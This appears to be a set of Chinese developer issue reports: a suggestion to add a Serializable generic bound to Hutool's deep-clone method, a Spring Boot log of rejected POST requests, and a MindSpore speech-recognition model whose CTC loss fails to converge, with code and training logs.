ObjUtil.cloneByStream要求对象实现Serializable的约束,"HuTool现有的深拷贝 <em>ObjUtil.cloneByStream()</em> 要求对象必须实现 <em>Serializable</em> 接口，这个可以考虑用Java的泛型约束来实现，这样可以将错误提前到编译器： 改为 下面为测试代码   <code>: public static &lt;T&gt; T cloneByStream(T obj) { public static &lt;T extends Serializable&gt; T cloneByStream(T obj) { package cn.hutool; import cn.hutool.core.clone.CloneSupport; import cn.hutool.core.lang.Assert; import cn.hutool.core.util.ObjUtil; import cn.hutool.core.util.SerializeUtil; import org.junit.Test; import java.io.Serializable; import java.util.ArrayList; import java.util.List; public class Practice01CoreCloneable { public static &lt;T extends Serializable&gt; T cloneByStream(T obj) { return SerializeUtil.clone(obj); } public static class Dog extends CloneSupport&lt;Dog&gt; implements Serializable { private String name = ""wangwang""; private int age = 3; private List&lt;String&gt; list = new ArrayList&lt;String&gt;() { { add(""a""); add(""b""); add(""c""); } }; } @Test public void testCloneable() { Dog dog1 = new Dog(); // 深克隆1 Dog dog2 = cloneByStream(dog1); Assert.notEquals(dog1.list, dog2.list); // 深克隆2 dog2 = ObjUtil.cloneByStream(dog1); Assert.notEquals(dog1.list, dog2.list); } }"
2019-06-04 10:52:47.929  WARN 10584 --- [io-18888-exec-5] o.s.web.servlet.PageNotFound             : Request method 'POST' not supported,点击登录后调到error页面.   <code>: 2019-06-04 10:52:00.738 INFO 10584 --- [ main] s.w.ClassOrApiAnnotationResourceGrouping : Group for method updateapplycomplete was 采购流程接口 2019-06-04 10:52:00.789 INFO 10584 --- [ main] s.b.c.e.t.TomcatEmbeddedServletContainer : Tomcat started on port(s): 18888 (http) 2019-06-04 10:52:00.794 INFO 10584 --- [ main] boot.spring.Application : Started Application in 11.721 seconds (JVM running for 17.829) 2019-06-04 10:52:35.469 INFO 10584 --- [io-18888-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring FrameworkServlet 'dispatcherServlet' 2019-06-04 10:52:35.469 INFO 10584 --- [io-18888-exec-1] o.s.web.servlet.DispatcherServlet : FrameworkServlet 'dispatcherServlet': initialization started 2019-06-04 10:52:35.488 INFO 10584 --- [io-18888-exec-1] o.s.web.servlet.DispatcherServlet : FrameworkServlet 'dispatcherServlet': initialization completed in 19 ms 2019-06-04 10:52:47.929 WARN 10584 --- [io-18888-exec-5] o.s.web.servlet.PageNotFound : Request method 'POST' not supported 2019-06-04 10:53:04.413 WARN 10584 --- [io-18888-exec-6] o.s.web.servlet.PageNotFound : Request method 'POST' not supported 2019-06-04 10:53:13.974 WARN 10584 --- [io-18888-exec-7] o.s.web.servlet.PageNotFound : Request method 'POST' not supported 2019-06-04 10:56:26.491 WARN 10584 --- [o-18888-exec-10] o.s.web.servlet.PageNotFound : Request method 'POST' not supported 2019-06-04 10:56:35.352 WARN 10584 --- [io-18888-exec-4] o.s.web.servlet.PageNotFound : Request method 'POST' not supported 2019-06-04 10:58:03.746 WARN 10584 --- [io-18888-exec-8] o.s.web.servlet.PageNotFound : Request method 'POST' not supported
使用CTCLoss做损失函数时不收敛,"Hardware Environment(): /device gpu : -- MindSpore version: mindspore r1.2 / r1.3 -- Python version:Python 3.7.5 -- OS platform and distribution:Linux Ubuntu 18.04 搭建DFCNN模型 参考此处的函数 定义CTC损失函数 参考此处的函数 <ol start=""3""> 数据处理 音频处理工具参考 数据类 参考此处函数的写法 <ol start=""4""> 训练流程 写法一：普通写法 自定义 训练流程 写法二：自定义优化网络 参考此处类编写的优化网络 训练流程 无论采用上述两种训练流程的哪一种都无法达到loss收敛的效果，表现为震荡 无论采用上述流程中出现的两种优化器中的哪一种，也无法达到loss收敛的效果，表现为震荡 超参数方面，batch_size 分别采用了, 学习率分别采用了 进行训练，同样无法达到loss收敛的效果，表现为震荡 按照使用实现的仓库，预期应该达到稳定收敛的效果 训练记录： 训练到epoch为200，基本上也是震荡的结果 希望获得相关的帮助，谢谢！   <code>: CreateModel from mindspore import nn, ops, Tensor import numpy as np class DFCNN_v3(nn.Cell): """"""DFCNN model """""" def __init__(self, num_classes = 1209, input_nc = 1, max_wav_length=1600, max_label_length = 50): super(DFCNN_v3,self).__init__() self.max_wav_length = max_wav_length self.max_label_length = max_label_length # structure # seq 1 self.conv11 = nn.Conv2d( in_channels=input_nc, out_channels=32, kernel_size=(3,3), has_bias=False, pad_mode='same', weight_init='HeNormal' ) self.relu11 = nn.ReLU() self.drop11 = nn.Dropout(1-0.05) self.conv12 = nn.Conv2d( in_channels=32, out_channels=32, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu12 = nn.ReLU() self.maxpool1 = nn.MaxPool2d(kernel_size=2, stride=2, pad_mode='valid') self.drop12 = nn.Dropout(1-0.05) # seq 2 self.conv21 = nn.Conv2d( in_channels=32, out_channels=64, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu21 = nn.ReLU() self.drop21 = nn.Dropout(1-0.1) self.conv22 = nn.Conv2d( in_channels=64, out_channels=64, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu22 = nn.ReLU() self.maxpool2 = nn.MaxPool2d(kernel_size=2, stride=2, pad_mode='valid') self.drop22 = nn.Dropout(1-0.1) # seq 3 self.conv31 = nn.Conv2d( in_channels=64, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu31 = nn.ReLU() self.drop31 = nn.Dropout(1-0.15) self.conv32 = nn.Conv2d( in_channels=128, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu32 = nn.ReLU() self.maxpool3 = nn.MaxPool2d(kernel_size=2, stride=2, pad_mode='valid') self.drop32 = nn.Dropout(1-0.15) # seq 4 self.conv41 = nn.Conv2d( in_channels=128, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu41 = nn.ReLU() self.drop41 = nn.Dropout(1-0.2) self.conv42 = nn.Conv2d( in_channels=128, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu42 = nn.ReLU() self.maxpool4 = nn.MaxPool2d(kernel_size=1, stride=1, pad_mode='valid') self.drop42 = nn.Dropout(1-0.2) # seq 5 self.conv51 = nn.Conv2d( in_channels=128, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu51 = nn.ReLU() self.drop51 = nn.Dropout(1-0.2) self.conv52 = nn.Conv2d( in_channels=128, out_channels=128, kernel_size=(3,3), has_bias=True, pad_mode='same', weight_init='HeNormal' ) self.relu52 = nn.ReLU() self.maxpool5 = nn.MaxPool2d(kernel_size=1, stride=1, pad_mode='valid') self.reshape = ops.Reshape() self.drop6 = nn.Dropout(1-0.3) # hidden self.hidden = nn.Dense(in_channels=3200, out_channels=128, activation='relu', has_bias=True, weight_init='HeNormal') self.drop7 = nn.Dropout(1-0.3) self.fc = nn.Dense(in_channels=128, out_channels=num_classes, has_bias=True, weight_init='HeNormal') self.out = nn.Softmax() def feature(self,x): # seq 1 x = self.conv11(x) x = self.relu11(x) x = self.drop11(x) x = self.conv12(x) x = self.relu12(x) x = self.maxpool1(x) x = self.drop12(x) # seq 2 x = self.conv21(x) x = self.relu21(x) x = self.drop21(x) x = self.conv22(x) x = self.relu22(x) x = self.maxpool2(x) x = self.drop22(x) # seq 3 x = self.conv31(x) x = self.relu31(x) x = self.drop31(x) x = self.conv32(x) x = self.relu32(x) x = self.maxpool3(x) x = self.drop32(x) # seq 4 x = self.conv41(x) x = self.relu41(x) x = self.drop41(x) x = self.conv42(x) x = self.relu42(x) x = self.maxpool4(x) x = self.drop42(x) # seq 5 x = self.conv51(x) x = self.relu51(x) x = self.drop51(x) x = self.conv52(x) x = self.relu52(x) x = self.maxpool5(x) return x def construct(self, x): x = self.feature(x) x = self.reshape(x, (-1, x.shape[2], 3200)) x = self.drop6(x) x = self.hidden(x) x = self.drop7(x) x = self.fc(x) x = self.out(x) return x ctc_loss from mindspore import nn from mindspore.ops import composite as C from mindspore.ops import functional as F from mindspore.ops import operations as P class ctc_loss(nn.Cell): def __init__(self): super(ctc_loss, self).__init__() self.loss = P.CTCLoss(preprocess_collapse_repeated=False, ctc_merge_repeated=True, ignore_longer_outputs_than_inputs=False) self.mean = P.ReduceMean() self.transpose = P.Transpose() self.reshape = P.Reshape() def construct(self, inputs, labels_indices, labels_values, sequence_length): inputs = self.transpose(inputs, (1, 0, 2)) loss, _ = self.loss(inputs, labels_indices, labels_values, sequence_length) loss = self.mean(loss) return loss def compute_time_freq_images(filepath): """"""生成音频时频图 Args: filepath (str): 文件地址 Returns: numpy.array: 视频特征图 """""" # -------------- 1.读取音频文件 ------------ fs, wavsignal = wav.read(filepath) # wavsignal 即为频谱图 # 转换为numpy数组 wav_arr = np.array(wavsignal) # 频谱长度 wav_length = len(wavsignal) # ------------- 2.汉明窗 ---------------- x=np.linspace(0, 400 - 1, 400, dtype = np.int64) w = 0.54 - 0.46 * np.cos(2 * np.pi * (x) / (400 - 1)) # 采样点（s） = fs # 采样点（ms）= fs / 1000 # 采样点（帧）= fs / 1000 * 帧长 # ------------- 3.对数据分帧 -------------- # 帧长： 25ms time_window = 25 # 帧移： 10ms window_length = fs // 1000 * time_window # -------------- 4.分帧加窗 ------------------ # 最终生成的窗数 window_end = int(wav_length/fs*1000 - time_window) // 10 # 最终输出结果 data_input = np.zeros((window_end,window_length//2),dtype=np.float) data_line = np.zeros((1, window_end), dtype = np.float) # 分帧 for i in range(0, window_end): p_start = i * 160 p_end = p_start + window_length data_line = wav_arr[p_start:p_end] data_line = data_line * w # 加窗 # -------- 5.傅里叶变换：生成时频图 ------------- data_line = np.abs(fft(data_line)) data_input[i]=data_line[0:window_length//2] # 设置为window_length除以2的值（即200）是取一半数据，因为是对称的 # 取对数，求db data_input = np.log(data_input + 1) return data_input def divmod(array,div=8): """"""整除处理 Args: array (numpy.array): 数组 div (int, optional): 欲被整除数. Defaults to 8. Returns: numpy.array: 整除后的数 """""" return array[:array.shape[0]//div*div, :] ST_MJ_Generator_batch_fixed_length import os import mindspore as ms from mindspore import train import mindspore.context as context import numpy as np import random from utils import compute_time_freq_images,divmod import mindspore.dataset as ds class thchs30(object): # static idx2label, label2idx = {}, {} def __init__(self, dataset_path, batch_size, div = 8, stage='train', wav_max_len=1600, lab_max_len=50): """"""初始化 Args: dataset_path (str): 数据集根目录 div (int, optional): 整除除数，根据模型的特征，前向传播后max_time维度缩小了8倍 . Defaults to 8. stage (str, optional): 数据集所属阶段: {train,test,dev}. Defaults to 'train'. wav_max_len (int, optional): 语谱图最长长度. Defaults to 1640. lab_max_len (int, optional): 标签数组最长长度. Defaults to 50. """""" self.dataset_path = dataset_path self.stage = stage # train、test、eval阶段 self.wav_max_len = wav_max_len self.lab_max_len = lab_max_len self.div = div self.batch_size = batch_size # 拿到音频文件、对应标注文件列表 self.wav_list, self.label_lst = self.get_thchs_data(dir=self.stage) self.dataset_size = len(self.wav_list)//self.batch_size # 生成标签数据 self.label_data = self.generate_thchs_label_data(label_lst=self.label_lst,dir=self.stage) # 建立整个数据集的标签2id的索引 if len(thchs30.idx2label)&lt;=0 or len(thchs30.label2idx)&lt;=0: _, self.all_label_lst = self.get_thchs_data(dir='data') self.all_label_data = self.generate_thchs_label_data(label_lst=self.all_label_lst,dir='data') thchs30.idx2label, thchs30.label2idx = self.build_vocab(self.all_label_data) def get_thchs_data(self, dir): """"""从thchs30数据源中获取音频文件以及标注文件的列表 Args: dir (str): 数据集路径:{'train','dev','test'} Returns: tuple: (标注列表，音频列表) """""" # train_file = source_file + '/data' data_file = os.path.join(self.dataset_path, dir) label_lst = [] wav_lst = [] for root, dirs, files in os.walk(data_file): for file in files: if file.endswith('.wav') or file.endswith('.WAV'): wav_file = os.sep.join([root, file]) label_file = wav_file + '.trn' wav_lst.append(wav_file) label_lst.append(label_file) # 检查音频、标签对应相同 self.check( label_lst=label_lst, wav_lst=wav_lst ) return wav_lst, label_lst def check(self,label_lst,wav_lst): """"""检查音频、标签对应相同 Args: label_lst (list): 标签列表 wav_lst (list): 音频文件列表 """""" label_len = len(label_lst) wav_len = len(wav_lst) assert label_len==wav_len,""音频文件与音频标签数量不匹配，请检查数据集是否完整"" for i in range(label_len): wavname = (wav_lst[i].split('/')[-1]).split('.')[0] labelname = (label_lst[i].split('/')[-1]).split('.')[0] assert wavname == labelname,f""音频文件: {wavname}与 标签文件: {labelname} 不匹配，请检查"" def read_thchs_label(self,label_file,dir): """"""读取thchs30的标签文件 Args: label_file (str): 标签路径 Returns: str: 标签行 """""" with open(label_file, 'r', encoding='utf8') as f: data = f.readlines() if dir in ['train','test','dev']: # 获取真实的路径 root = label_file.split(self.stage)[0] real_path = os.path.join(root,self.stage,data[0].strip()) with open(real_path, 'r', encoding='utf8') as f2: data2 = f2.readlines() return data2[1] else: return data[1] def generate_thchs_label_data(self,label_lst,dir): """"""生成标签列表 Args: label_lst (list): 标签文件列表 Returns: list: 标签字符串列表 """""" label_data = [] for label_file in label_lst: pny = self.read_thchs_label(label_file=label_file,dir=dir) label_data.append(pny.strip('\n')) return label_data def build_vocab(self,label_data): """"""建立索引，id映射到标签，标签映射到id Args: label_data (list): 标签列表 Returns: tuple: idx2label (dict): 键为id，值为label label2idx (dict): 键为label，值为id """""" label_set = set() idx2label = {} label2idx = {} for line in label_data: line = line.split(' ') for pny in line: if pny not in label_set: label_set.add(pny) # 空白字符 label_set.add('_') for idx,label in enumerate(label_set): idx2label[idx] = label label2idx[label] = idx return idx2label,label2idx def __len__(self): return self.dataset_size def __getitem__(self,index): """"""随机索引 Args: index (int): 下标 """""" img_batch = [] label_batch = [] for i in range(index * self.batch_size, (index + 1) * self.batch_size): wav_path, label_path = self.wav_list[i], self.label_lst[i] # 处理音频 # 生成语谱图 fq_img = compute_time_freq_images(wav_path) fq_img = divmod(fq_img,self.div) # fq_img = self.wav_pad(fq_img) # 处理标签 # 标签转id label = self.read_thchs_label(label_file=label_path,dir=self.stage) label, len = self.line2id(label, self.label2idx) # label = self.lab_pad(label) img_batch.append(fq_img) label_batch.append(label) img_batch, wav_max_len = self.wav_pad(img_batch) # label_batch, lab_len = self.lab_pad(label_batch) label_batch, lab_len = self.encode(label_batch) label_indices = [] for i, _ in enumerate(lab_len): for j in range(lab_len[i]): label_indices.append((i, j)) label_indices = np.array(label_indices, dtype=np.int64) sequence_length = np.array([wav_max_len//8] * self.batch_size, dtype=np.int32) # img_batch = np.array(img_batch, dtype= np.float32) # label_batch = np.array(label_batch, dtype= np.int32) return img_batch, label_indices, label_batch, sequence_length def line2id(self,line,label2idx): """"""将单行语音的标签映射为id Args: line (list): 单行语音标签 label2idx (dict): 标签-&gt;id的映射字典 Returns: list: 映射的id列表 """""" label = [label2idx[pny.strip()] for pny in line.split(' ')] return label, len(label) def wav_pad(self,wav_data_lst): """"""时频图数组按照 最长序列 进行补齐padding， 以及生成ctc需要获得的信息：输入序列的长度列表 """""" wav_lens = [len(data) for data in wav_data_lst] wav_max_len = max(wav_lens) wav_lens = np.array([leng//8 for leng in wav_lens]) new_wav_data_lst = np.zeros((len(wav_data_lst), 1, wav_max_len, 200), dtype=np.float32) for i in range(len(wav_data_lst)): new_wav_data_lst[i, 0, :wav_data_lst[i].shape[0], :] = wav_data_lst[i] return new_wav_data_lst, wav_max_len def encode(self, label): """"""convert text-label into text-index. input: text: text labels of each image. [batch_size] output: text: concatenated text index for CTCLoss. [sum(text_lengths)] = [text_index_0 + text_index_1 + ... + text_index_(n - 1)] length: length of each text. [batch_size] """""" lab_lst = [] length = [len(s) for s in label] for labs in label: for lab in labs: lab_lst.append(lab) return np.array(lab_lst, dtype=np.int32), np.array(length) def lab_pad(self, label_data_lst): """"""标签数组按照 最长序列 进行补齐 padding """""" label_lens = np.array([len(label) for label in label_data_lst]) max_label_len = max(label_lens) new_label_data_lst = np.zeros((len(label_data_lst), max_label_len), dtype=np.int32) for i in range(len(label_data_lst)): new_label_data_lst[i][:len(label_data_lst[i])] = label_data_lst[i] return new_label_data_lst, label_lens @staticmethod def get_vocab(): return thchs30.idx2label ,thchs30.label2idx def get_dataset(dataset_path ='./dataset/data_thchs30',div=8, batch_size=64, test_dev_batch_size = 8, num_parallel_workers=4): """"""获取训练集、测试机、验证集、以及id-&gt;标签的映射词典、标签-&gt;id的映射词典 Args: dataset_path (str, optional): 数据集路径. Defaults to '/home/jojo/PythonProjects/speech_data/data_thchs30'. div (int, optional): 需被整除的除数. Defaults to 1. batch_size (int, optional): batch大小. Defaults to 64. num_parallel_workers (int, optional): 线程数. Defaults to 4. Returns: tuple: 训练集、测试机、验证集、以及id-&gt;标签的映射词典、标签-&gt;id的映射词典 """""" train_generator = thchs30(dataset_path=dataset_path, batch_size= batch_size, div=div,stage='train') test_generator = thchs30(dataset_path=dataset_path, batch_size= batch_size, div=div, stage='test') dev_generator = thchs30(dataset_path=dataset_path, batch_size= batch_size, div=div, stage='dev') train_dataset = ds.GeneratorDataset(source=train_generator, column_names=['img', 'label_indices', 'label_batch', 'sequence_length'], shuffle=True, num_parallel_workers=num_parallel_workers) test_dataset = ds.GeneratorDataset(source=test_generator, column_names=['img', 'label_indices', 'label_batch', 'sequence_length'], shuffle=False, num_parallel_workers=num_parallel_workers) dev_dataset = ds.GeneratorDataset(source=dev_generator, column_names=['img', 'label_indices', 'label_batch', 'sequence_length'], shuffle=False, num_parallel_workers=num_parallel_workers) # vocab idx2label ,label2idx = train_generator.get_vocab() return train_dataset, test_dataset, dev_dataset, idx2label ,label2idx WithLossCell class WithLossCell(nn.Cell): def __init__(self, backbone, loss_fn): super(WithLossCell, self).__init__(auto_prefix=False) self._backbone = backbone self._loss_fn = loss_fn def construct(self, img, label_indices, text, sequence_length): model_predict = self._backbone(img) return self._loss_fn(model_predict, label_indices, text, sequence_length) @property def backbone_network(self): return self._backbone if __name__=='__main__': context.set_context(mode=context.GRAPH_MODE, device_target='GPU',device_id=1) batch_size=32 test_dev_batch_size=16 learning_rate = 1e-7 epochs = 1000 loss_scale = 8096 # data train_loader, test_loader, dev_loader, idx2label ,label2idx = get_dataset_v2(batch_size=batch_size, test_dev_batch_size=test_dev_batch_size) # network net = DFCNN_v3(num_classes=len(label2idx)) net.set_train(True) net.set_grad(True) # Criterion criterion = ctc_loss() # optim opt = nn.RMSProp(params=net.trainable_params(), centered=True, learning_rate=learning_rate, momentum=0.9, loss_scale=loss_scale) # opt = nn.Adam(net.trainable_params(), learning_rate= learning_rate, beta1=0.9, beta2=0.999, weight_decay=0.0, eps=10e-8) net = WithLossCell(net, criterion) net.set_train(True) model = Model(net, optimizer=opt) # mindInsight summary_collector = SummaryCollector(summary_dir='./summary_dir', collect_freq=1) model.train(200, train_loader, callbacks=[LossMonitor(10), summary_collector], dataset_sink_mode=False) CNNCTCTrainOneStepWithLossScaleCell class CNNCTCTrainOneStepWithLossScaleCell(nn.Cell): """""" Encapsulation class of CNNCTC network training. Used for GPU training in order to manage overflowing gradients. Args: network (Cell): The training network. Note that loss function should have been added. optimizer (Optimizer): Optimizer for updating the weights. scale_sense (Cell): Loss scaling value. """""" def __init__(self, network, optimizer, scale_sense): super(CNNCTCTrainOneStepWithLossScaleCell, self).__init__(auto_prefix=False) self.network = network self.optimizer = optimizer if isinstance(scale_sense, nn.Cell): self.loss_scaling_manager = scale_sense self.scale_sense = Parameter(Tensor(scale_sense.get_loss_scale(), dtype=mstype.float32), name=""scale_sense"") elif isinstance(scale_sense, Tensor): if scale_sense.shape == (1,) or scale_sense.shape == (): self.scale_sense = Parameter(scale_sense, name='scale_sense') else: raise ValueError(""The shape of scale_sense must be (1,) or (), but got {}"".format( scale_sense.shape)) else: raise TypeError(""The scale_sense must be Cell or Tensor, but got {}"".format( type(scale_sense))) self.network.set_grad() self.weights = ParameterTuple(network.trainable_params()) self.grad = C.GradOperation(get_by_list=True, sens_param=True) self.reducer_flag = False self.parallel_mode = context.get_auto_parallel_context(""parallel_mode"") if self.parallel_mode not in ParallelMode.MODE_LIST: raise ValueError(""Parallel mode does not support: "", self.parallel_mode) if self.parallel_mode in [ParallelMode.DATA_PARALLEL, ParallelMode.HYBRID_PARALLEL]: self.reducer_flag = True self.grad_reducer = None if self.reducer_flag: mean = context.get_auto_parallel_context(""gradients_mean"") degree = get_group_size() self.grad_reducer = DistributedGradReducer(optimizer.parameters, mean, degree) self.is_distributed = (self.parallel_mode != ParallelMode.STAND_ALONE) self.clip_gradients = ClipGradients() self.cast = P.Cast() self.addn = P.AddN() self.reshape = P.Reshape() self.hyper_map = C.HyperMap() self.less_equal = P.LessEqual() self.allreduce = P.AllReduce() def construct(self, img, label_indices, text, sequence_length): weights = self.weights loss = self.network(img, label_indices, text, sequence_length) scaling_sens = self.scale_sense grads = self.grad(self.network, weights)(img, label_indices, text, sequence_length, self.cast(scaling_sens, mstype.float32)) grads = self.hyper_map(F.partial(grad_scale, scaling_sens), grads) grads = self.clip_gradients(grads, GRADIENT_CLIP_MIN, GRADIENT_CLIP_MAX) if self.reducer_flag: #apply grad reducer on grads grads = self.grad_reducer(grads) success = self.optimizer(grads) ret = (loss, scaling_sens) return F.depend(ret, success) import numpy as np import mindspore import mindspore.common.dtype as mstype from mindspore import context, Tensor, nn from mindspore.train.model import Model from mindspore import nn, Model, context from mindspore.train.callback import LossMonitor, SummaryCollector from mindspore.train.model import Model from utils import get_dataset_v2 from model import DFCNN_v3, ctc_loss from utils import CNNCTCTrainOneStepWithLossScaleCell, WithLossCell if __name__=='__main__': context.set_context(mode=context.GRAPH_MODE, device_target='GPU',device_id=0) batch_size=32 test_dev_batch_size=16 learning_rate = 1e-7 epochs = 1000 loss_scale = 8096 # data train_loader, test_loader, dev_loader, idx2label ,label2idx = get_dataset_v2(batch_size=batch_size, test_dev_batch_size=test_dev_batch_size) # network net = DFCNN_v3(num_classes=len(label2idx)) net.set_train(True) net.set_grad(True) # Criterion criterion = ctc_loss() # optim # opt = nn.RMSProp(params=net.trainable_params(), # centered=True, # learning_rate=learning_rate, # momentum=0.9, # loss_scale=loss_scale) opt = nn.Adam(net.trainable_params(), learning_rate= learning_rate, beta1=0.9, beta2=0.999, weight_decay=0.0, eps=10e-8) net = WithLossCell(net, criterion) scaling_sens = Tensor(np.full((1), loss_scale), dtype=mstype.float32) net = CNNCTCTrainOneStepWithLossScaleCell(net, opt, scaling_sens) net.set_train(True) model = Model(net) # mindInsight summary_collector = SummaryCollector(summary_dir='./summary_dir', collect_freq=1) model.train(200, train_loader, callbacks=[LossMonitor(10), summary_collector], dataset_sink_mode=False) 8 / 16 / 32 / 64 1e-2 / 1e-3 / 1e-4 / 1e-5 / 1e-6 / 1e-7 Keras epoch: 1 step: 10, loss is 981.21497 epoch: 1 step: 20, loss is 920.0064 epoch: 1 step: 30, loss is 1163.002 epoch: 1 step: 40, loss is 1051.8005 epoch: 1 step: 50, loss is 915.2398 epoch: 1 step: 60, loss is 980.9232 epoch: 1 step: 70, loss is 1049.3817 epoch: 1 step: 80, loss is 1006.6881 epoch: 1 step: 90, loss is 902.88025 epoch: 1 step: 100, loss is 857.3002 epoch: 1 step: 110, loss is 974.6164 epoch: 1 step: 120, loss is 1008.895 epoch: 1 step: 130, loss is 911.1226 epoch: 1 step: 140, loss is 1051.4349 epoch: 1 step: 150, loss is 1108.2954 epoch: 1 step: 160, loss is 843.0115 epoch: 1 step: 170, loss is 962.4203 epoch: 1 step: 180, loss is 1112.1902 epoch: 1 step: 190, loss is 935.7456 epoch: 1 step: 200, loss is 969.2573 epoch: 1 step: 210, loss is 1027.2615 epoch: 1 step: 220, loss is 964.85706 epoch: 1 step: 230, loss is 1022.51874 epoch: 1 step: 240, loss is 1146.8427 epoch: 1 step: 250, loss is 1144.1064 epoch: 1 step: 260, loss is 968.22485 epoch: 1 step: 270, loss is 1007.31946 epoch: 1 step: 280, loss is 903.9442 epoch: 1 step: 290, loss is 889.1499 epoch: 1 step: 300, loss is 937.6492 epoch: 1 step: 310, loss is 1009.95825 epoch: 2 step: 8, loss is 884.0536 epoch: 2 step: 18, loss is 843.71356 epoch: 2 step: 28, loss is 965.4662 epoch: 2 step: 38, loss is 957.0636 epoch: 2 step: 48, loss is 1010.46875 epoch: 2 step: 58, loss is 890.026 epoch: 2 step: 68, loss is 950.8784 epoch: 2 step: 78, loss is 995.1792 epoch: 2 step: 88, loss is 1110.4834 epoch: 2 step: 98, loss is 903.1423 epoch: 2 step: 108, loss is 1102.4971 epoch: 2 step: 118, loss is 1003.1974 epoch: 2 step: 128, loss is 1193.1042 epoch: 2 step: 138, loss is 941.41504 epoch: 2 step: 148, loss is 877.07227 epoch: 2 step: 158, loss is 1064.4486 epoch: 2 step: 168, loss is 968.05457 epoch: 2 step: 178, loss is 1251.9092 epoch: 2 step: 188, loss is 1081.3889 epoch: 2 step: 198, loss is 969.5681 epoch: 2 step: 208, loss is 1057.0046 epoch: 2 step: 218, loss is 895.97144 epoch: 2 step: 228, loss is 1048.1667 epoch: 2 step: 238, loss is 969.6384 epoch: 2 step: 248, loss is 1042.5835 epoch: 2 step: 258, loss is 963.1589 epoch: 2 step: 268, loss is 937.74945 epoch: 2 step: 278, loss is 1171.0769 epoch: 2 step: 288, loss is 964.39075 epoch: 2 step: 298, loss is 1116.3226 epoch: 2 step: 308, loss is 863.4107 epoch: 3 step: 6, loss is 957.0416 epoch: 3 step: 16, loss is 920.0482 epoch: 3 step: 26, loss is 956.62866 epoch: 3 step: 36, loss is 890.63196 epoch: 3 step: 46, loss is 942.25684 epoch: 3 step: 56, loss is 999.56256 epoch: 3 step: 66, loss is 1171.0386 epoch: 3 step: 76, loss is 1112.1306 epoch: 3 step: 86, loss is 857.32544 epoch: 3 step: 96, loss is 875.41284 epoch: 3 step: 106, loss is 1074.3572 epoch: 3 step: 116, loss is 1010.2066 epoch: 3 step: 126, loss is 952.87244 epoch: 3 step: 136, loss is 974.329 epoch: 3 step: 146, loss is 912.5075 epoch: 3 step: 156, loss is 1020.64087 epoch: 3 step: 166, loss is 991.72723 epoch: 3 step: 176, loss is 955.46954 epoch: 3 step: 186, loss is 916.8352 epoch: 3 step: 196, loss is 981.05853 epoch: 3 step: 206, loss is 1088.1619 epoch: 3 step: 216, loss is 1036.1743 epoch: 3 step: 226, loss is 1028.282 epoch: 3 step: 236, loss is 996.18774 epoch: 3 step: 246, loss is 1022.9551 epoch: 3 step: 256, loss is 864.55457 epoch: 3 step: 266, loss is 920.1044 epoch: 3 step: 276, loss is 957.9892 epoch: 3 step: 286, loss is 1036.0693 epoch: 3 step: 296, loss is 1062.4915 epoch: 3 step: 306, loss is 909.3805 epoch: 4 step: 4, loss is 981.09656 epoch: 4 step: 14, loss is 982.95166 epoch: 4 step: 24, loss is 1001.92285 epoch: 4 step: 34, loss is 878.4995 epoch: 4 step: 44, loss is 973.2862 epoch: 4 step: 54, loss is 1008.6048 epoch: 4 step: 64, loss is 1024.0979 epoch: 4 step: 74, loss is 915.8197 epoch: 4 step: 84, loss is 1028.2595 epoch: 4 step: 94, loss is 943.04565 epoch: 4 step: 104, loss is 929.6287 epoch: 4 step: 114, loss is 1074.4226 epoch: 4 step: 124, loss is 991.43005 epoch: 4 step: 134, loss is 1022.4305 epoch: 4 step: 144, loss is 1009.13135 epoch: 4 step: 154, loss is 943.4614 epoch: 4 step: 164, loss is 964.8312 epoch: 4 step: 174, loss is 1081.8723 epoch: 4 step: 184, loss is 1082.707 epoch: 4 step: 194, loss is 948.08923 epoch: 4 step: 204, loss is 1095.9504 epoch: 4 step: 214, loss is 1175.9397 epoch: 4 step: 224, loss is 1091.1387 epoch: 4 step: 234, loss is 1055.198 epoch: 4 step: 244, loss is 1071.0304 epoch: 4 step: 254, loss is 870.7978 epoch: 4 step: 264, loss is 910.2603 epoch: 4 step: 274, loss is 982.0127 epoch: 4 step: 284, loss is 937.0791 epoch: 4 step: 294, loss is 1082.9833 epoch: 4 step: 304, loss is 982.42554 epoch: 5 step: 2, loss is 901.8628 epoch: 5 step: 12, loss is 857.27454 epoch: 5 step: 22, loss is 927.3452 epoch: 5 step: 32, loss is 957.97864 epoch: 5 step: 42, loss is 915.3256 epoch: 5 step: 52, loss is 1116.2747 epoch: 5 step: 62, loss is 1091.7053 epoch: 5 step: 72, loss is 1021.9752 epoch: 5 step: 82, loss is 1008.9304 epoch: 5 step: 92, loss is 991.5321 epoch: 5 step: 102, loss is 976.2539 epoch: 5 step: 112, loss is 981.7383 epoch: 5 step: 122, loss is 1148.4232 epoch: 5 step: 132, loss is 1162.916 epoch: 5 step: 142, loss is 922.62415 epoch: 5 step: 152, loss is 942.26794 epoch: 5 step: 162, loss is 857.6564 epoch: 5 step: 172, loss is 1009.49615 epoch: 5 step: 182, loss is 1108.1681 epoch: 5 step: 192, loss is 937.6199 epoch: 5 step: 202, loss is 1217.3104 epoch: 5 step: 212, loss is 909.12415 epoch: 5 step: 222, loss is 874.6768 epoch: 5 step: 232, loss is 981.0012 epoch: 5 step: 242, loss is 1170.7162 epoch: 5 step: 252, loss is 937.729 epoch: 5 step: 262, loss is 884.05176 epoch: 5 step: 272, loss is 1064.8322 epoch: 5 step: 282, loss is 974.6556 epoch: 5 step: 292, loss is 1144.1216 epoch: 5 step: 302, loss is 974.49304 epoch: 5 step: 312, loss is 936.09827 epoch: 6 step: 10, loss is 903.9752 epoch: 6 step: 20, loss is 922.6549 epoch: 6 step: 30, loss is 941.7437 epoch: 6 step: 40, loss is 968.17926 epoch: 6 step: 50, loss is 1049.436 epoch: 6 step: 60, loss is 935.638 epoch: 6 step: 70, loss is 982.24585 epoch: 6 step: 80, loss is 949.3783 epoch: 6 step: 90, loss is 1060.3809 